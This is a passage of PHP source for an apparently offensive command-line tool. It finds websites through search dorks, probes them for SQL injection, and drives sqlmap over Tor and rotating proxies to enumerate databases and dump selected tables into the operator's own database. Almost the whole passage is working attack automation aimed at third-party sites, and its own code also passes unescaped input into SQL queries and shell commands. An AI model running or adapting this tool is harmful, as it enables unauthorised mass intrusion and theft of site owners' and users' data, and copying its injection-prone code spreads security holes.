        elseif($line == '2')
        {
            $this->override = true;
            
            echo "\nUrl (string): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->singleUrl = $value;
            
            echo "\nThreads (integer 1-10): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->threads = $value;
            
            echo "\nRisk Level (Integer 1-3): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->risk_level = $value;
            
            echo "\nOptimize (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->optimize = '-o';
            
            echo "\nDump results (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->dumpResults = true;
            
            echo "\nUse proxy (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y'){ $this->useProxy = true;
                echo "\nProxy circulator: 0-2: ";
                $handle = fopen ("php://stdin","r");
                $value = trim(fgets($handle));
                if(!empty($value))
                    $this->proxy_circ = $value;
            }
            
            echo "\nDisplay color (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'n') $this->color = 0;
            
            $this->FetchGoogleResults('single');   
        }
        
        elseif($line == '3')
        {
            $this->override = true;
            
            echo "\nScan hash: ";
            $handle = fopen ("php://stdin","r");
            $hash = trim(fgets($handle));
            
            $database = new database();
            $results = $database->query("SELECT vulnerable_websites FROM Prescanned WHERE hash_identifier='$hash'", true);
            $vulnerableWebsiteArray = array();
            while ($row = mysqli_fetch_array($results))
                $vulnerableWebsiteArray = explode('|', $row['vulnerable_websites']);
            
            if(empty($vulnerableWebsiteArray))
                $this->ThrowError(17);
            
            $int = 0;
            
            foreach($vulnerableWebsiteArray as $el)
            {
                echo "\n [$int]: $el";
                $int++;
            }   
            
            echo "\n\nWhich of the following array elements do you want to have scanned? (seperate numbers by comma, use 'all' to scan all.): ";
            
            $handle = fopen ("php://stdin","r");
            $line = fgets($handle);

            if(trim($line) != 'all')
                $answerArray = explode(',', $line);
            else 
                for($e = 0; $e != count($vulnerableWebsiteArray); $e++)
                    $answerArray[] = $e;

            // rebuild array
            $rebuildArray = array();

            foreach($answerArray as $answer)
                $rebuildArray[] = (int)$answer;

            foreach($rebuildArray as $key)
                $this->websites[] = $vulnerableWebsiteArray[$key];
            
            echo "\nThreads (integer 1-10): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->threads = $value;
            
            echo "\nRisk Level (Integer 1-3): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->risk_level = $value;
            
            echo "\nOptimize (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->optimize = '-o';
            
            echo "\nDump results (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->dumpResults = true;
            
            echo "\nDisplay color (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'n') $this->color = 0;
            
            $this->ExecuteSQLMAP();

        }
        elseif($line == '4') 
        {
            $this->scanOnly = true;
            $this->scanContent = true;
            
            echo "\nDork (string): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->dork = $value;
            
            echo "\nCount (integer/max): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->pagesPerDork = $value;
            
            echo "\nTimeout (integer): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->timeout = $value;
            
            echo "\nOverride results (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->override = true;
            
            echo "\nDump results (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y') $this->dumpResults = true;
            
            echo "\nUse proxy (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'y'){ $this->useProxy = true;
                echo "\nProxy circulator: 0-2: ";
                $handle = fopen ("php://stdin","r");
                $value = trim(fgets($handle));
                if(!empty($value))
                    $this->proxy_circ = $value;
            }
            
            echo "\nDisplay color (y/n): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if($value == 'n') $this->color = 0;
            
            $this->mode = 'auto';
            $this->FetchGoogleResults();
        }
        elseif($line=='5')
        {
            $this->remove = true;
            $this->dumpResults = true;
            
            echo "\nFlags (ASDWC-X): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->flags = $value;
            
           echo "\nPassword (ASDWC-X): ";
            $handle = fopen ("php://stdin","r");
            $value = trim(fgets($handle));
            if(!empty($value))
                $this->password = $value;
            
            $this->RemoveAllEntries($this->flags);
        }
    }
    
    /**
     * Get Data from tables
     * 
     * @param type $table
     */
    private function ExecuteSQLMAPData($table)
    {
        $website = $this->current_target_plain;
        $this->Dump($website,false,"Fetching Data");
        
        $start = (isset($this->start) ? '--start='.$this->start : '');
        $end = (isset($this->end)&&$this->end>0 ? '--stop='.$this->end : '');
        
        $tor = ($this->useTor ?  '--tor --tor-port='.self::TORPORT : '');
        $risklevel = ($this->risk_level>0 ? "--risk=$this->risk_level" : "");
        
        
        if($this->isAspSite)
            $sqlMapCommand = "python SQLmap/sqlmap.py -u '$website' -D $this->currentDatabaseName -T $table --dump $tor --threads=$this->threads $risklevel {$this->GetCurrentProxy()} --batch $this->optimize $start $end";                
        else 
            $sqlMapCommand = "python SQLmap/sqlmap.py -u '$website' -T $table --dump $tor --threads=$this->threads $risklevel {$this->GetCurrentProxy()} --batch $this->optimize $start $end"; 
            
        $sqlmapTableResults = array();
        $this->Dump($sqlMapCommand,false,"SQLmap started [Data]");
        exec($sqlMapCommand, $sqlmapTableResults);
        $this->AnalyseData();
    }
    
    /**
     * Analyses the sqlmap result of the tables
     * 
     * @param type $domain
     */
    private function AnalyseData()
    {   
        // read csv file and dump records in database
        $result_array = array();
        
        if($this->isAspSite)
            $absolutePath = ($this->currentHostwww ? self::SAVEDIR.'www.'.$this->current_domain_full.'/dump/'.$this->currentDatabaseName.'/'.$this->currentTableName.'.csv' : self::SAVEDIR.$this->current_domain_full.'/dump/'.$this->currentDatabaseName.'/'.$this->currentTableName.'.csv');
        else
            $absolutePath = ($this->currentHostwww ? self::SAVEDIR.'www.'.$this->current_domain_full.'/dump/'.'Microsoft_Access_masterdb'.'/'.$this->currentTableName.'.csv' : self::SAVEDIR.$this->current_domain_full.'/dump/'.$this->currentDatabaseName.'/'.$this->currentTableName.'.csv');        
        
        $this->Dump($this->currentDatabaseName, false, 'currentdatabasename');
        $this->Dump($this->currentTableName, false, 'currenttablename');
        $this->Dump($absolutePath, false, 'fullpath');
       
        exec("cat $absolutePath", $result_array);
        
        $this->Dump($absolutePath, false, 'cat command');
        
        $lineCounter = 0;
        $columnCounter = 0;
        $columns  = explode(',', $result_array[0]);
        
        foreach($columns as $column)
        {
            $this->Dump('Column Found: '.$column,false, null, true, true, 1);
            $this->ToDatabase(4, false, $column);        
            
            foreach($result_array as $line)
            {
                if($lineCounter ==0)
                { 
                    $lineCounter++;
                    continue;
                }
                
                $lineArray = explode(',', $line);
                
                if($lineArray[$columnCounter] == '' || $lineArray[$columnCounter]==null)
                    continue;
                
                $this->ToDatabase(5, false, $lineArray[$columnCounter]);
                $this->Dump('Piece of data: '.$lineArray[$columnCounter],false, null, true, true, 1);
            }
            
            $columnCounter++;
            $this->currentColumnCount = $columnCounter;
            $lineCounter = 0;
        }        
    }
    
    /**
     * Analyses the sqlmap result of the tables
     * 
     * @param type $domain
     */
    private function AnalyseTables()
    {
        $this->availableTables[] = array();
        $DirectoryResults = array();
        $absolutePath = ($this->currentHostwww ? self::SAVEDIR.'www.'.$this->current_domain_full : self::SAVEDIR.$this->current_domain_full);
        exec('ls ' . $absolutePath,$DirectoryResults);

        foreach($DirectoryResults as $file)
        {
            if($file == 'log') // If a log file exists...
            {
                $logResult = array();
                
                exec('cat ' .$absolutePath.'/log',$logResult);
                
                if(empty($logResult)) // Break if the file is empty
                {
                    $this->Dump('Cat result is empty! Command: '.'cat ' .$absolutePath.'/log',false, null, true, false, 2);
                    break;
                }   
                
                $this->Dump('Cat result not empty.',false, null, true, true, 1);

                
                // The file is not empty
                $lineCounter = 0;
                
                foreach($logResult as $logLine)
                {
                    $inline = strpos($logLine,"tables]");
                    
                    if($inline === false)
                    {
                        $lineCounter++;
                        continue;
                    }
                    else
                    {
                        $subString = str_replace('[','',$logLine);
                        $foundTables = $subString[0];
                        
                        if($foundTables==0)
                        {
                            $this->Dump('No tables found!',false, null, true, false, 2);
                            $lineCounter++;
                            continue;
                        }
                    }

                    $lineCounter+=2;
                    
                    while(true)
                    {
                        $PDB = $logResult[$lineCounter];
                                                
                        if(strpos($PDB, '|') === FALSE)
                                break;
                        
                        $PDB = str_replace('|', '', $PDB);
                        $PDB = str_replace(' ', '', $PDB);
                        
                        $this->availableTables[] = $PDB;
                        $this->Dump('Found table: '.$PDB,false, null, true, true, 1);
                        
                        $lineCounter++;
                    }
                    
                    $this->Dump($this->availableTables, true, 'Available Tables Found');
                    $this->GetData();
                    break;
                }   
            }
        }
    }
    
    /**
     * Analyse log files to determine if the selected domain is vulnerable
     * 
     * @param array $array
     */
    private function AnalyseVulnerable($domain)
    {
        $this->availableDatabases = array();
        $this->scriptCounter = 0;
        
        $DirectoryResults = array();
        $empty = false;   
        $www = '';
        
        if($this->currentHostwww)
        {
            $www = 'www.';
            exec('ls ' . self::SAVEDIR.'www.'.$this->current_domain_full,$DirectoryResults);
        }
        else
            exec('ls ' . self::SAVEDIR.$this->current_domain_full,$DirectoryResults);
        
        foreach($DirectoryResults as $file)
        {
            if($file == 'log') // If a log file exists...
            {
                $logResult = array();
                
                exec('cat ' .self::SAVEDIR.$www.$this->current_domain_full.'/log',$logResult);               
                                
                if(empty($logResult)) // Target is not vulnerable
                {
                    $empty = true;
                    $this->Dump('Cat result is empty! Command: '.'cat ' .self::SAVEDIR.$www.$this->current_domain_full.'/log',false, null, true, false,2);
                    break;
                }
                
                $this->Dump('Cat result not empty.',false, null, true, true, 1);

                // The file is not empty so target is most likely vulnerable
                $lineCounter = 0;
                
                foreach($logResult as $logLine)
                {                 
                    $inline = strpos($logLine,"available databases [");                                   
                    
                    if(strpos($logLine, 'back-end DBMS: Microsoft Access') !== false && !$this->ASPscanned)
                    {
                        $this->Dump('Detected ASP IIS 6, proceeding with --tables option', false, null, true, true);
                        $this->isAspSite = true;
                        $this->ASPscanned = true;
                        $this->ExecuteSQLMAPTables(null);
                    }  else
                        $this->isAspSite = false;
                    
                    if($inline === false)
                    {
                        $lineCounter++;
                        continue;
                    }
                    else
                    {
                        $this->currentWebsiteIsVulnerable = true;
                        
                        $subString = str_replace('available databases [','',$logLine);
                        $foundDatabases = $subString[0];
                        
                        if($foundDatabases ==0)
                        {
                            $this->Dump('No databases found.',false, null, true, false, 2);
                            $lineCounter++;
                            continue;
                        }
                    }

                    $lineCounter++;
                    
                    while (true)
                    {   
                        $PDB = $logResult[$lineCounter];
                        
                        if(strpos($PDB, '[*]') === false)
                        {
                            break;
                        }
                        
                        $rest = trim($PDB, "[*] ");
                        $lineCounter++;
                        
                        if($rest == 'information_schema' || $rest == 'performance_schema')
                            continue;
                        
                        $this->Dump('Found database: '.$rest,false, null, true, true, 1);
                        
                        if($this->CheckDatabaseName($rest))
                        {
                            $this->availableDatabases[] = $rest;
                            $this->Dump("Database [$rest] seems to be valid", false, null, true, true, 1);
                        }
                        else
                        {
                             $this->Dump("Database [$rest] seems to be INvalid", false, null, true, false, 2);
                        }
                    }
                }   
                
                if($empty)
                {
                    $this->Dump('RETURNS', false, 'RETURNED');
                    return;
                }
                
                $this->scriptCounter++;
                $_avdb = array();
                
                foreach($this->availableDatabases as $availableDatabase)
                   $_avdb[] =  '[*] '.$availableDatabase;
                
                $this->Dump($_avdb, true, 'Available Databases Found');
                $this->GetTables();
            }
        }
    }
        
    
    /**
     * Import files.
     */
    private function ImportFiles()
    {
        require('database.php');
        require('Msft/Exception.php');
        require('simple_html_dom.php');
        require_once('Msft/Bing/Exception.php');
        require_once('Msft/Bing/Search/Exception.php');
        require_once('Msft/Bing/Search.php');
        require_once('Libraries/OAuth.php');
    }
    
    /**
     * Deletes current folder to retrieve tables/data in a new log file.
     */
    private function DeleteCurrentFolder()
    {
        $DirectoryResults = array();
                        
        $absolutePath = self::SAVEDIR.'www.'.$this->current_domain_full; 
        exec('ls ' . $absolutePath, $DirectoryResults);
        
        if(!isset($DirectoryResults[1])) // no www
            exec('rm -r ' . self::SAVEDIR.$this->current_domain_full,$DirectoryResults);  
        else
            exec('rm -r ' . $absolutePath,$DirectoryResults);  
        
        $this->Dump($DirectoryResults, true, 'Deleted Current folder');
    }
    
    /**
     * Generate hash
     * 
     * @param type $length
     * @return string
     */
    private function GenerateHash($length = 10) 
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';

        for ($i = 0; $i < $length; $i++) 
            $randomString .= $characters[rand(0, strlen($characters) - 1)];

        return $randomString;
    }
    
    /**
     * Detect irrelevant DB names.
     * 
     * @param type $OrDatabase
     * @return boolean
     */
    private function CheckDatabaseName($OrDatabase)
    {
        $DatabasesToSkip = array("master", "temp", "model", "msdb");
        
        foreach($DatabasesToSkip as $db)
            if(strpos($OrDatabase, $db)===false) // valid
                return true;
            else
                return false;
    }

    /**
     * Checks if target is scanned.
     * 
     * @param string $domain_name
     * @return boolean
     */
    private function CheckInDatabase($domain_name)
    {
        $domainInsert = parse_url($domain_name, PHP_URL_HOST);
        $domainInsert = (strpos($domainInsert, 'www.') ? $domainInsert : trim($domainInsert, 'www.'));
        
        $database = new database();
        $domainExtention = '';
        $pieces = parse_url($domain_name);
        $domain = isset($pieces['host']) ? $pieces['host'] : '';
        $domain = (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i',$domain,$regs) ? $domain = ($regs['domain']) : false);
        $domain_ar = explode('.',$domain);
        $domain_name_pure = $domain_ar[0];
        
        $this->target = $domain;
            
        $this->Dump($domain_name_pure, false, "Check in Database");
        
        $counter = 0;
        
        foreach($domain_ar as $domain_part)
        {            
            if(!$counter == 0 || !strlen($domain_part) > 4)
            {
                $domainExtention .= '.'.$domain_part; 
            }
            
            $counter++;
        }
            
        // Check if domain already exists as table
        $query  = "SELECT * FROM Website WHERE domain='$domainInsert'";
        $result = $database->query($query,true);
        $table_exists = false;
        
        while($row = mysqli_fetch_assoc($result)) 
        {            
             if($row['domain'] == $domainInsert)
             {
                $this->Dump("Domain [$domainInsert] already exists in database!", false, null, true, false, 2);
                return true; // ABORT
             }
        }
        if(!$table_exists) // Table does not exist
        {
            $this->Dump("Domain [$domainInsert] does not exist yet.", false, null, true, false, 1);
            return false; // GO
        }        
    }
    
    /**
     * Set the current domain.
     * 
     * @param String $target
     */
    private function SetCurrentDomain($target)
    {
        $pieces = parse_url($target);
        $domain = isset($pieces['host']) ? $pieces['host'] : '';
        
        if(strpos($pieces['host'], 'www') === FALSE)
        {
            $this->currentHostwww = false;
            $this->current_domain_full = $pieces['host'];
        }
        else
        {
            $this->currentHostwww = true;
            $this->current_domain_full = str_replace('www.', '', $pieces['host']);
        }      
    }

    /**
     * Check if website is vulnerable.
     * 
     * @param string $website
     * @return type
     */
    private function ContentScan($website)
    {
        $this->Dump($website, false, "Content Scan");        
        $_website = $website .= "%27"; // Add apostrophe to url 
        $pageContent = $this->GetFileContent($_website);
        
        $bool = false;
                
        if(strpos($pageContent,'You have an error in your SQL syntax') || strpos($pageContent, '80040e14') || strpos($pageContent, '800a000d') || strpos($pageContent, '800a0d5d'))
            $bool = true;        
        if ($bool === false) 
        {
            $this->currentWebsiteIsVisiblyVulnerable = false;
            $this->Dump('Target is NOT visibly vulnerable.', false, null, true, false, 2);
        } 
        else  
        {
            $this->currentWebsiteIsVisiblyVulnerable = true;
            $this->Dump('Target is visibly vulnerable.', false, null, true, true);
        }
        
        $this->ToDatabase(1);

        return $bool;
    }
  
    /**
     * Enables or Disables error reporting
     */
    private function ErrorReporting()
    {
        $E = (self::ERROR_REPORT ? 1 : 0);
        
        ini_set('display_startup_errors',$E);
        ini_set('display_errors',$E);
        error_reporting(-$E);
    }
    
    /**
     * Echo's output and optionally write to a log file
     *  
     * @param string|array $output
     * @param boolean $is_array
     */
    private function Dump($output, $is_array = false, $title = "No Description", $isSubMessage = false, $positive=false, $color=0)
    {
        if($this->color === 0)
            $color = 0;
        
        if(!$this->dumpResults)
            return 0;
        
        $outputScript = '';
        $date = date('Y-m-d H:i:s');
        $title_new = '<-------------'.strtoupper($title).'------------->';
        $outputCLI = "$title_new [$date]";

        if($color ==1) // Succes
            $outputCLI = chr(27) . "[42m"  ."$title_new [$date]" . chr(27) . "[0m";
        else if ($color==2) // Warning
            $outputCLI = chr(27) . "[43m" ."$title_new [$date]" . chr(27) . "[0m";
        else if ($color==3) // Error
            $outputCLI = chr(27) . "[41m" ."$title_new [$date]" . chr(27) . "[0m";
        
        
        if($is_array)   
        {
            $date = date('Y-m-d H:i:s');
            echo(PHP_EOL."$title_new [$date]".PHP_EOL);
            var_dump($output, true);
            echo PHP_EOL;
            $outputScript = '<div id="message_box">'.'<div id="message_head">'.$title.'</div>'.'<div id="message_body">'.$this->ArrayToHtml($output).'</div><h3>'.$date.'</h3></div>';
        }
        else
        {
            echo(PHP_EOL.$outputCLI.PHP_EOL);
            echo($output);
            echo PHP_EOL;
            
            if ($isSubMessage)
                if(!$positive)
                    $outputScript = '<div id="message_block_bad"><div id="inner_block_bad">'.$output.'</div></div>';                    
                else
                    $outputScript = '<div id="message_block_good"><div id="inner_block_good">'.$output.'</div></div>';
            else
                $outputScript = '<div id="message_box">' . '<div id="message_head">' . $title . '</div>' . '<div id="message_body">' . $output . '</div><h3>' . $date . '</h3></div>';
        }   
        
        if(self::LOG)
        {
            if($this->logFile == '') // Not Written
            {
                $this->logFile = self::LOGDIR.'log ['.(string)date('Y-m-d H:i:s').'].html';
                $handle = fopen($this->logFile,'a');
                fwrite($handle, '<!html doctype=html><html> <head><link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Ubuntu"/> </head> <style> body { background-color: rgb(250,250,250); } #message_box { margin-top:100px; margin-left: 20%; background-color: rgb(250,250,250); margin-bottom:100px; width: 60%; position: relative; padding-bottom: 50px; box-shadow: 0px 0px 5px 0px rgba(50, 50, 50, 0.46); } #message_body { margin-top: 10px; margin-left: 8px; font-family: "Ubuntu"; font-size: 15px; text-align: left; background-color: rgb(250,250,250); color: black; } h1 { height: 50px; font-family: "Ubuntu"; margin-top:30px; font-size: 80px; color: gray; text-shadow: 0 3px 0 rgba(0, 0, 0, 0.73); text-align: center; } h1 { height: 30px; font-family: "Ubuntu"; margin-top:30px; margin-bottom:150px; font-size: 80px; color: gray; text-shadow: 0 3px 0 rgba(0, 0, 0, 0.73); text-align: center; } h3 { line-height: 12em; height: 50px; margin-left: 80%; font-family: "Ubuntu"; font-size: 15px; color: gray; text-shadow: 1px black 1,2,2; text-align: center; } #message_head { line-height: 1.6em; text-shadow: 0 1.4px 0 rgba(0, 0, 0, 0.73); height: 50px; font-family: "Ubuntu"; font-size: 30px; color: white; background-color: rgb(75, 146, 223); text-align: center; } #message_block_good { height:30px; margin-top:100px; margin-left: 10%; background-color: rgb(9, 63, 9); margin-bottom:100px; width: 60%; border-left:40px solid darkgreen; padding-bottom: 20px; padding-top: 20px; box-shadow: 0px 0px 5px 0px rgba(50, 50, 50, 0.46); } #inner_block_good { position: relative; margin-left: 8px; height: 30px; line-height: 2em; font-family: "Ubuntu"; font-size: 15px; text-align: left; text-shadow: 0 1.4px 0 rgba(0, 0, 0, 0.73); color: rgb(223, 223, 223); } #message_block_bad { height:30px; margin-top:100px; margin-left: 10%; background-color: rgb(63, 9, 9); margin-bottom:100px; width: 60%; border-left:40px solid darkred; padding-bottom: 20px; padding-top: 20px; box-shadow: 0px 0px 5px 0px rgba(50, 50, 50, 0.46); } #inner_block_bad { position: relative; margin-left: 8px; height: 30px; line-height: 2em; font-family: "Ubuntu"; font-size: 15px; text-align: left; text-shadow: 0 1.4px 0 rgba(0, 0, 0, 0.73); color: rgb(223, 223, 223); </style> <body> <h1>SQLMAP Results</h1>');             
            }   
            else
            {
                $handle = fopen($this->logFile,'a');
            }
            
            fwrite($handle,$outputScript);
            fclose($handle);
        }
    }
    
    /**
     * Convert Array to Html String
     *  
     * @param array $array
     * @return string
     */
    private function ArrayToHtml($array = array())
    {
        $html = '<br /><br/ >';

        if(empty($array))
            return 'Empty Array :(';
        
        foreach($array as $line)
            $html .= $line.'<br />';
        
        return $html.= '<br />';
    }
    
    /**
     * Validate a list of proxies
     * 
     * @param array|string $proxies
     * @return array
     */
    private function ValidateProxy($proxies)
    {
        $proxyList = array();
        $arrayProxies = array();
        
        if(is_string($proxies))
            $proxyList[] = $proxies;
        else
            $proxyList = $proxies;
        
        foreach($proxies as $proxy)
        {
            $ch = curl_init();
            curl_setopt($ch,CURLOPT_URL, self::URLPING);
            curl_setopt($ch,CURLOPT_PROXY,$proxy);
            curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
            curl_setopt($ch,CURLOPT_HEADER,1);
            curl_exec($ch);
            
            $curlResults = curl_getinfo($ch);
            $arrayProxies[][$curlResults['total_time']] = $proxy;
            
            curl_close($ch);
        }
        
        sort($arrayProxies, SORT_NUMERIC);
        $this->Dump($arrayProxies,true,"PROXY RESULTS");   
        
        return $arrayProxies;
    }
    
    /**
     * Empty specified tables.
     * 
     * @param type $flags
     */
    private function RemoveAllEntries($flags)
    {
        if(empty($flags))
            $this->ThrowError(8);
        if(strtoupper(md5($this->password)) !== 'E5027E4C9F12FD7D851AF57442CF9D9B')
            $this->ThrowError(7);
        
        $flagsArray = str_split($flags);
        
        foreach($flagsArray as $flag)
        {
            switch($flag)
            {
                case 'D':
                    $this->ToDatabase(6); // Databases
                    break;
                case 'T':
                    $this->ToDatabase(7); // Tables
                    break;
                case 'W':
                    $this->ToDatabase(8); // Websites
                    break;
                case 'C':
                    $this->ToDatabase(9); // Columns
                    break;
                case 'A':
                    $this->ToDatabase(10); // Data
                    break;
                case 'S':
                    $this->ToDatabase(11); // Scans
                    break;
                case 'X': 
                    $this->ToDatabase(12); // All
                    break;
            }
        }
    }
    
    /**
     * Check's if url is valid
     */
    private function ValidateUrl()
    {
        $filteredUrls = array();
        
        foreach($this->websites as $website)
        {
            if(!strpos($website,'?'))
                continue;
            if(!strpos($website,'='))
                continue;
            
            $filteredUrls[] = $website;
        }
        
        $this->websites = $filteredUrls;
    }
        
    /**
     * Get all tables from a database   
     */
    private function GetTables()
    {
        foreach($this->availableDatabases as $database)
        {
            $this->ToDatabase(2, false, $database); // Save database
            $this->DeleteCurrentFolder(); // Delete current folder to renew SQLmap results
            $this->ExecuteSQLMAPTables($database);
        }
    }

    /**
     * Get the data from the tables
     */
    private function GetData()
    {
        foreach($this->availableTables as $table)
        {
            if($table == array())
            {
                $this->Dump('Table is equivalent to array.', false, null, true, false, 2);
                continue;
            }
            
            $this->currentTableName = $table;
            
            $this->ToDatabase(3, false, $table); // Save table  
                            
            if(!$this->IsInterestingTable($table) || !$this->filterTables($table))
                continue; // Continue if table is not interesting otherwise, gather information.
            
            $this->ExecuteSQLMAPData($table);
        }
        
        $this->availableTables[] = array();
        $this->DeleteCurrentFolder(); // Delete current folder to renew SQLmap results
    }
}

$SQLmap = new SQLmap();

if(empty($argv))
{
    exit('No arguments. Type --help for a list of commands.');
}
else
{
    $command = '';
    
    foreach($argv as $arg)
    {
        $arg_array = explode('=',$arg);
        
        if(isset($arg_array[0]) && !isset($arg_array[1]))
            $command .= (empty($command) ? $arg_array[0] : '*'.$arg_array[0]);
        else if(isset($arg_array[0]) && isset($arg_array[1]))
            $command .= (empty($command) ? $arg_array[0].'~'.$arg_array[1] : '*'.$arg_array[0].'~'.$arg_array[1]);$command .= ($arg_array[0] == "dork" ? '=' : '');
    }
    
    $SQLmap->Process($command);
}   